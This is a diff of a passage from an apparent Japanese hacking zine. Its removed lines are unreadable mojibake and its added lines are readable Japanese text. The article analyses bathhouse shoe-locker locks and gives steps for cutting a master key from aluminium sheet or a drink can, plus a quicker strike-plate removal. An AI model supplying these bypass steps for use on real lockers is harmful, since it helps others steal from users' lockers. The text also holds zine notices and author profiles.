-�ƁA����A�Ƌ���B�������łǂ��Ȃ��Ă��邩���m�F����Ƃ킩��܂��B���W���J
-���āA������m�F����Ǝ��̂悤�ɂȂ��Ă��܂��i�}9�Q�Ɓj�B���W�����猩�Ă�
-�邽�߁AA��B�̈ʒu�͐�قǂ̉摜�Ƌt�ɂȂ�܂��B
+　左右にある円柱のうち、円柱A（左側の円柱）が若干下に移動しないと、円柱B
+（右側の円柱）は下がりません。
+　円柱Aを持つ金具を金具A、円柱Bを持つ金具を金具Bと呼ぶことにします。する
+と、金具Aと金具Bが内部でどうなっているかを確認するとわかります。裏蓋を開
+けて、金具を確認すると次のようになっています（図9参照）。裏蓋側から見てい
+るため、AとBの位置は先ほどの画像と逆になります。
 
-�i�}9�Fhttp://wizardbible.org/60/images/syoutiku9.png�j�{�����̋���A�Ƌ���B�̏��
+（図9：http://wizardbible.org/60/images/syoutiku9.png）施錠時の金具Aと金具Bの状態
 
-�@�~��A�Ɖ~��B�̐����ʒu�͎኱����Ă��܂��B�~��A�̕����~��B������Ɉ�
-�u���܂��B���̂��߁A�����ł���؎D��}������ƁA�ŏ��ɉ~��A�ɓ�����A����
-�ړ����܂��B����Ǝ��𒆐S�ɋ���̐�[���オ��܂��B����A�̐�[����ɏオ
-��΁A����B�̐�[���オ�邱�Ƃ��ł��܂��B�������A����A�̐�[���オ���Ă�
-�Ȃ���΁A����B�̐�[�ł���ʕ��͋���A�̉����ɂ͂܂�A�����܂���B
+　円柱Aと円柱Bの水平位置は若干ずれています。円柱Aの方が円柱Bよりも上に位
+置します。そのため、合鍵である木札を挿入すると、最初に円柱Aに当たり、下に
+移動します。すると軸を中心に金具の先端が上がります。金具Aの先端が先に上が
+れば、金具Bの先端も上がることができます。しかし、金具Aの先端が上がってい
+なければ、金具Bの先端である凸部は金具Aの凹部にはまり、動きません。
 
-�@�������̉~�������̏�Ԃ͎��̒ʂ�ł��i�}10�A�}11�Q�Ɓj�B
+　解錠時の円柱や金具の状態は次の通りです（図10、図11参照）。
 
-�i�}10�Fhttp://wizardbible.org/60/images/syoutiku12.jpg�j�������̉~��A�Ɖ~��B�̏��
-�i�}11�Fhttp://wizardbible.org/60/images/syoutiku11.jpg�j�������̋���A�Ƌ���B�̏��
+（図10：http://wizardbible.org/60/images/syoutiku12.jpg）解錠時の円柱Aと円柱Bの状態
+（図11：http://wizardbible.org/60/images/syoutiku11.jpg）解錠時の金具Aと金具Bの状態
 
-�@�~����������؂��Ă���A�x�����O�̓����Ɉ�������ł���l�q���킩��܂��B
+　円柱が下がり切っており、閂が錠前の内部に引っ込んでいる様子がわかります。
 
 
-��0x04.) ���|���̃}�X�^�[�L�[�̍쐬
+■0x04.) 松竹錠のマスターキーの作成
 
-�@�P���ɏ��|�����������邾���ł���΁A�󂯍������O�������������葁��
-�ł��傤�B�󂯍��͌˘g�ɑ΂��āA�����o���Ƀl�W�Ŏ��t�����Ă��܂��B
+　単純に松竹錠を解錠するだけであれば、受け座を取り外した方が手っ取り早い
+でしょう。受け座は戸枠に対して、剥き出しにネジで取り付けられています。
 
-�@���|���ɂ̓}�X�^�[�L�[�����݂��āA�}�X�^�[�L�[�����ł��̔�����Ă��܂��B
-�������i��2,000�~���x�ł��B
+　松竹錠にはマスターキーが存在して、マスターキーだけでも販売されています。
+実売価格は2,000円程度です。
 
-�@�u�����̖؎D�̗����̌��R�̈ʒu�Ƒ傫���v�Ɓu�E�H�[�h���̓����v����A��
-�D�̗��[�������c���āA�^�񒆂�؂蔲���΃}�X�^�[�L�[�Ƃ��ċ@�\����Ɛ���
-�ł��܂��B����ɂ͏��|���̖؎D�̑}��������������ώ@���邱�ƂŁA������2�{
-�̉~�������ɓ�����A�E�H�[�h�ɓ�����Ȃ��`��ł���΂悢�̂ŁA��L�̐���
-�͊m�M�ɂȂ�܂����B
-�@���|���ȊO�ł��A�E�H�[�h�������O�ł���΁A���ʂ̍l�����Ń}�X�^�[�L�[
-���쐬�ł���\���������ł��B
+　「複数の木札の裏側の鍵山の位置と大きさ」と「ウォード錠の特徴」から、木
+札の両端だけを残して、真ん中を切り抜けばマスターキーとして機能すると推測
+できます。さらには松竹錠の木札の挿入口から内部を観察することで、内部の2本
+の円柱だけに当たり、ウォードに当たらない形状であればよいので、上記の推測
+は確信になりました。
+　松竹錠以外でも、ウォードを持つ錠前であれば、共通の考え方でマスターキー
+を作成できる可能性が高いです。
 
-�@�}�X�^�[�L�[��؍ނō쐬����̂ł���΁A�������l������K�v������܂��B
-���K�̖؎D�̌�����10mm�ł��B����Ɠ������A����������������ł���΁A��
-�O�ɖ��Ȃ��}�����邱�Ƃ��ł��܂��B
+　マスターキーを木材で作成するのであれば、厚さを考慮する必要があります。
+正規の木札の厚さは10mmです。これと同じか、これよりも薄い厚さであれば、錠
+前に問題なく挿入することができます。
 
-�@���ɁA�}�X�^�[�L�[�̌`��͎��̐��@�ɍ��킹�ăJ�b�g���܂��i�}1�Q�Ɓj�B
+　次に、マスターキーの形状は次の寸法に合わせてカットします（図1参照）。
 
-�i�}1�Fhttp://wizardbible.org/60/images/syoutiku_master1.png�j�}�X�^�[�L�[�̐��@
+（図1：http://wizardbible.org/60/images/syoutiku_master1.png）マスターキーの寸法
 
-�@���@�ɍ����Ă��āA��r�I�d�����̂ł���΁A�؍ވȊO�ł��A���r�i���~��
-�ł���p�\�j������ȂǂŃ}�X�^�[�L�[����邱�Ƃ��ł��܂��B
-�@�����ł́AHIKARI�̃A���~�i100�~300mm�A����0.3mm�j�����H���܂��i�}2�Q
-�Ɓj�B�z�[���Z���^�[��158�~�ōw�����܂����B
+　寸法に合っていて、比較的硬いものであれば、木材以外でも、塩ビ板（下敷き
+でも代用可能）や金属板などでマスターキーを作ることができます。
+　ここでは、HIKARIのアルミ板（100×300mm、厚み0.3mm）を加工します（図2参
+照）。ホームセンターで158円で購入しました。
 
-�i�}2�Fhttp://wizardbible.org/60/images/syoutiku_master2.jpg�j���H�Ώۂ̃A���~��
+（図2：http://wizardbible.org/60/images/syoutiku_master2.jpg）加工対象のアルミ板
 
-�@0.3mm���x�ł���΁A���ʂ̃n�T�~�ł��J�b�g���邱�Ƃ��ł��܂��B����g�p��
-���A���~�͍�����100mm�Ȃ̂ŁA�}�X�^�[�L�[�̍�����100mm�ɒ������܂����B
-�����āA�c��̕����Ɋւ��Ă͏�L�ɒ񎦂������@�ɍ����悤�ɁA�}�W�b�N�ň�
-��t���܂��i�}3�Q�Ɓj�B
+　0.3mm程度であれば、普通のハサミでもカットすることができます。今回使用し
+たアルミ板は高さが100mmなので、マスターキーの高さを100mmに調整しました。
+そして、残りの部分に関しては上記に提示した寸法に合うように、マジックで印
+を付けます（図3参照）。
 
-�i�}3�Fhttp://wizardbible.org/60/images/syoutiku_master3.jpg�j���t�����Ƃ���
+（図3：http://wizardbible.org/60/images/syoutiku_master3.jpg）印を付けたところ
 
-�@��͈�����킹�ăn�T�~�ȂǂŃJ�b�g���邾���ł��B
+　後は印を合わせてハサミなどでカットするだけです。
 
-�@���������}�X�^�[�L�[�����|���ɑ}�����܂��B���̍ہA���̕ǖʂɍ��킹����
-�Ԃő}�����܂��B����ƁA�x���������݁A�������܂��i�}4�Q�Ɓj�B
+　完成したマスターキーを松竹錠に挿入します。その際、奥の壁面に合わせた状
+態で挿入します。すると、閂が引っ込み、解錠します（図4参照）。
 
-�i�}4�Fhttp://wizardbible.org/60/images/syoutiku_master4.jpg�j�}�X�^�[�L�[�ɂ�����
+（図4：http://wizardbible.org/60/images/syoutiku_master4.jpg）マスターキーによる解錠
 
-�@�}�X�^�[�L�[��p���ĉ������Ă���Ƃ��A������Ԃł͎��̂悤�ɂȂ�܂��i
-�}5�Q�Ɓj�B���S�ɃE�H�[�h���e�����邱�ƂȂ��A2�{�̉~���ɓ������Ă��܂��B
+　マスターキーを用いて解錠しているとき、内部状態では次のようになります（
+図5参照）。完全にウォードを影響することなく、2本の円柱に当たっています。
 
-�i�}5�Fhttp://wizardbible.org/60/images/syoutiku_master5.jpg�j�}�X�^�[�L�[�ɂ��������̓������
+（図5：http://wizardbible.org/60/images/syoutiku_master5.jpg）マスターキーによる解錠時の内部状態
 
-�@���b�h�u�������H���ă}�X�^�[�L�[���쐬���āA�����ł��邩�ǂ������m����
-�Ă݂܂����B�������A���������邽�߁A�~���������͂ɕ����A���Ȃ����Ă�
-�܂��A�����ɓ���܂���ł����B
-�@�����ŁA��܂�ɂ��āA���H���Ă݂��Ƃ���A�������邱�Ƃ��ł��܂����i
-�}6�Q�Ɓj�B�܂�Ԃ����Ƃ��낪���傤�Ǘ��[�̉~���ɂԂ����Ă��A�����͂̕�
-�����邽�߁A�~���������邽�߂ł��B
+　レッドブルを加工してマスターキーを作成して、解錠できるかどうかを確かめ
+てみました。しかし、板が薄すぎるため、円柱を押す力に負け、板が曲がってし
+まい、解錠に到りませんでした。
+　そこで、二つ折りにして、加工してみたところ、解錠することができました（
+図6参照）。折り返したところがちょうど両端の円柱にぶつかっても、復元力の方
+が勝るため、円柱が下がるためです。
 
-�i�}6�Fhttp://wizardbible.org/60/images/syoutiku30.jpg�j���b�h�u���ō쐬�������|���̃}�X�^�[�L�[
+（図6：http://wizardbible.org/60/images/syoutiku30.jpg）レッドブルで作成した松竹錠のマスターキー
 
 
-��0x05.) ���|���̐V��
+■0x05.) 松竹錠の新旧
 
-�@���|���H�Ƃ��̔����Ă����|���ɂ����^�ƐV�^�����݂��܂��i�}1�Q�Ɓj�B
+　松竹錠工業が販売してた松竹錠にも旧型と新型が存在します（図1参照）。
 
-�i�}1�Fhttp://wizardbible.org/60/images/syoutiku22.png�j���^�ƐV�^�̔�r
+（図1：http://wizardbible.org/60/images/syoutiku22.png）旧型と新型の比較
 
-�@���|���̑O�ʂɂ���u���|���v�Ƃ�������̏�ɁuPTxxxx-xxxxx�v�ix�͐��l�j
-�Ƃ����^�Ԃ̂悤�ȍ���̗L���Ŏ��ʂł��܂��B���݂���΋��^�A���݂��Ȃ���
-�ΐV�^�ɂȂ�܂��B
-�@�܂��A�����̏�̖͗l��u���|���v�Ƃ�������̃G���{�X�̐[���A���̘͂g��
-����̐[���ɍ��Ŏ��ʂł��܂��B���肪�[����΋��^�A�󂯂�ΐV�^�ɂȂ�܂��B
+　松竹錠の前面にある「松竹錠」という刻印の上に「PTxxxx-xxxxx」（xは数値）
+という型番のような刻印の有無で識別できます。存在すれば旧型、存在しなけれ
+ば新型になります。
+　また、数字の上の模様や「松竹錠」という刻印のエンボスの深さ、周囲の枠の
+彫りの深さに差で識別できます。彫りが深ければ旧型、浅ければ新型になります。
 
-�@����URL�ɂ��ƁA���^�ƐV�^�̂ǂ��炪���y���Ă��邩���킩��܂��B
+　次のURLによると、旧型と新型のどちらが普及しているかがわかります。
 
 http://www5e.biglobe.ne.jp/~wadyfarm/gesokujo.html
 
-�@���M���_�i2014�N11���j�ł́A���^��52�A�V�^��7�ɂȂ��Ă��܂��B���|�I
-�ɋ��^�̕������y���Ă���悤�ł��B
+　執筆時点（2014年11月）では、旧型が52個、新型が7個になっています。圧倒的
+に旧型の方が普及しているようです。
 
 
-��0x06.) �I���W�i���ł͂Ȃ����|��
+■0x06.) オリジナルではない松竹錠
 
-�@���|���̑�q�b�g�ɂ��A���|���H�ƈȊO�ł������̏��O��̔����Ă��܂��B
-�u���|���v�Ƃ������󂪂Ȃ����̂��I���W�i���ȊO�ƂȂ�܂��B
-�@���|���͑傫���A���t���ꏊ�𐧌����܂��B�܂��A�f�ނ␻���̃R�X�g����
-����܂��B���̂��߁A���|���̓o��ȍ~�́A�{���I�ȏ��O�̌����͓����ł��镗
-�C�����Ȃǂ��o�ꂵ�܂����B
+　松竹錠の大ヒットにより、松竹錠工業以外でも同等の錠前を販売しています。
+「松竹錠」という刻印がないものがオリジナル以外となります。
+　松竹錠は大きく、取り付け場所を制限します。また、素材や製造のコストがか
+かります。そのため、松竹錠の登場以降は、本質的な錠前の原理は同等である風
+呂屋錠などが登場しました。
 
-�@����Web�y�[�W�ł́A�����K���̏��|���̎ʐ^�����W���Ă��܂��B
+　次のWebページでは、温泉や銭湯の松竹錠の写真を収集しています。
 
 http://www.kt.rim.or.jp/~tsukasa/sento/subete/gesoku/gesoku.htm
 http://www.kt.rim.or.jp/~tsukasa/sento/subete/keys.htm
 
-�@���ɑ����̎�ނ����݂��邱�Ƃ��킩��܂��B
+　非常に多くの種類が存在することがわかります。
 
-�@���̒��ɂ͉��h���^�C�v�̏��|�������݂��܂��i�}1�Q�Ɓj�B�I���W�i���̏��|
-���͏d�͂𗘗p���邽�߁A�؎D���c�Ɏh���܂��B�������Ċm���߂��킯�ł͂Ȃ�
-�̂Ő����ɂȂ�܂����A���h���Ƃ������Ƃ́A�����ɂ΂˂����Ɨ\���ł��܂��B
+　その中には横刺しタイプの松竹錠が存在します（図1参照）。オリジナルの松竹
+錠は重力を利用するため、木札を縦に刺します。分解して確かめたわけではない
+ので推測になりますが、横刺しということは、内部にばねを持つと予測できます。
 
-�i�}1�Fhttp://wizardbible.org/60/images/syoutiku_y01.jpg�j���h���^�C�v�̏��|��
+（図1：http://wizardbible.org/60/images/syoutiku_y01.jpg）横刺しタイプの松竹錠
 
-�@���t����ꍇ�́A�x�̏o��������ӎ�����K�v������܂��B�E�����x���o��
-�ꍇ�͍��݃^�C�v�A�������x���o���ꍇ�͉E�݃^�C�v���w�����܂��B
-�@�Ⴆ�΁A�E�����x���o���Ƃ��ɉE�݃^�C�v���g�p���Ă��A�{���Ƃ����Ӗ��ł�
-��肠��܂��񂪁A���O�⌮�Ɉ󎚂���Ă��鐔���̌������t���ɂȂ��Ă��܂�
-�܂��B
+　取り付ける場合は、閂の出る方向を意識する必要があります。右側に閂を出す
+場合は左吊タイプ、左側に閂を出す場合は右吊タイプを購入します。
+　例えば、右側に閂を出すときに右吊タイプを使用しても、施錠という意味では
+問題ありませんが、錠前や鍵に印字されている数字の向きが逆さになってしまい
+ます。
 
 
-
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
-
- --- ��3��: ���m�点 ---
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
-��Wizard Bible�ihttp://wizardbible.org/�j�ł͐����A���M���C�^�[���W����
-���܂��B
-�@�������e�̃e�[�}�͍L�`�ł́uunder ground�v�ł��B�Ⴆ�΃n�b�L���O��Z�L
-�����e�B����s�b�L���O�Ȃǂƕ��L�����e���l���Ă��܂��B�܂�����ȐE�Ƃ��
-���̉���Ȃǂł��\���܂���B
-�@��񂫂�ł��\���܂���B�܂��K������A�ڂ���`��������܂���̂ŁA�ł�
-��͈͂ō\���܂���B�C�y�ɐ��������Ă��������B
+ --- 第3章: お知らせ ---
 
-��Kenji Aiko����Q&A������Ă���܂����B���߂ĎQ������l�ł��킩��₷��
-������Ă��܂��̂ŁA�Q�l�ɂ��Ă��������B
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+○Wizard Bible（http://wizardbible.org/）では随時、執筆ライターを募集して
+います。
+　扱う内容のテーマは広義での「under ground」です。例えばハッキングやセキ
+ュリティからピッキングなどと幅広い内容を考えています。また特殊な職業や趣
+味の解説などでも構いません。
+　一回きりでも構いません。また必ず毎回連載する義務もありませんので、でき
+る範囲で構いません。気軽に声をかけてください。
+
+○Kenji AikoさんがQ&Aを作ってくれました。初めて参加する人でもわかりやすく
+書かれていますので、参考にしてください。
 
 http://wizardbible.org/wbQandA.html
 
-��Wizard Bible�ɎQ����]�̕��͋C�y�Ƀ��[���iipusiron@gmail.com�j���������B
+○Wizard Bibleに参加希望の方は気軽にメール（ipusiron@gmail.com）ください。
 
 
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
-  --- ��4��: ���҃v���t�B�[�� ---
+  --- 第4章: 著者プロフィール ---
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
-�����ь�
-��Job: ����x����
-��Web: http://profile.ameba.jp/r00tapple/
-��Web2: http://www.packr.org/
-��Twitter: @r00tapple
-��Mail: packr@packr.org
-��Comment:
-�@IPUSIRON����A�n�b�J�[�̊w�Z�����o�ł��߂łƂ��������܂��B
-�@Kindle�łł����A������IPUSIRON���񂪏o���Ă�������̂ł�������m�F��
-�Ă݂Ă��������B
+■黒林檎
+●Job: 自宅警備員
+●Web: http://profile.ameba.jp/r00tapple/
+●Web2: http://www.packr.org/
+●Twitter: @r00tapple
+●Mail: packr@packr.org
+●Comment:
+　IPUSIRONさん、ハッカーの学校無事出版おめでとうございます。
+　Kindle版ですが、同じくIPUSIRONさんが出してらっしゃるのでこちらも確認し
+てみてください。
 http://www.amazon.co.jp/%E6%9C%AC-IPUSIRON/s?ie=UTF8&page=1&rh=n%3A465392%2Cp_27%3AIPUSIRON
-�@�ŋ߂́A�s�������֌W�̃l�^��ǂ��Ă���̂Ő��񋻖���������͘A�����Ă�
-�������B
-�@���C���̓}���E�F�A���g�p�����s�������ł����A�֘A�Z�p�ɂ�����������܂��B
+　最近は、不正送金関係のネタを追っているので是非興味がある方は連絡してく
+ださい。
+　メインはマルウェアを使用した不正送金ですが、関連技術にも興味があります。
 
 
-��IPUSIRON
-��Job: ����x����
-��Web: http://akademeia.info
-��Twitter: @ipusiron
-��Mail: ipusiron@gmail.com
-��Comment:
-�@2015�N���玩��x�����̖T��ŁA�F�X�������Ă���܂��B
-�E�w�n�b�J�[�̊w�Z�x�̏o��
+■IPUSIRON
+●Job: 自宅警備員
+●Web: http://akademeia.info
+●Twitter: @ipusiron
+●Mail: ipusiron@gmail.com
+●Comment:
+　2015年から自宅警備員の傍らで、色々活動しております。
+・『ハッカーの学校』の出版
 http://s-akademeia.sakura.ne.jp/main/books/school/
-�@�o�œ�����Amazon�ō݌ɐ؂�Ȃǂ̃g���u���Ȃǂ�����܂������A�F����̂�
-�����Ō��݂�4���܂ł����܂����B
-�E�n�[�h�E�F�A�^�L�[���K�[�{�ƃX�}�z���u����{�̖����L�����y�[��
-�@�ŏI�I��Kindle��PC���Ѓ����L���O1�ʁE2�ʂɓ��B���܂����B
+　出版当初はAmazonで在庫切れなどのトラブルなどがありましたが、皆さんのお
+かげで現在は4刷までいきました。
+・ハードウェア型キーロガー本とスマホ遠隔操作本の無料キャンペーン
+　最終的にKindleのPC書籍ランキング1位・2位に到達しました。
 http://www.amazon.co.jp/dp/B00OJ94DC4
 http://www.amazon.co.jp/gp/product/B00OORTYFW
-�E�܂ڂ낵������́u�^�Ă̕����Ձv�̗\��
-�@8���ɂ܂ڂ낵������Łu�^�Ă̕����Ձv�Ƃ����C�x���g���J�Â��܂��B�w�n�b
-�J�[�̊w�Z�x�̏o�ŋL�O�Ƃ��āA�u�n�b�J�[�����v��W�����N������Ȃǂ��Â�
-�\��ł��B�����̂�����́A���Ɏ���URL���Q�Ƃ��Ă��������B
+・まぼろし博覧会の「真夏の文化祭」の予定
+　8月にまぼろし博覧会で「真夏の文化祭」というイベントを開催します。『ハッ
+カーの学校』の出版記念として、「ハッカー教室」やジャンク即売会などを催す
+予定です。興味のある方は、次に示すURLを参照してください。
 http://usakoro.blogspot.jp/2015/04/blog-post.html
 
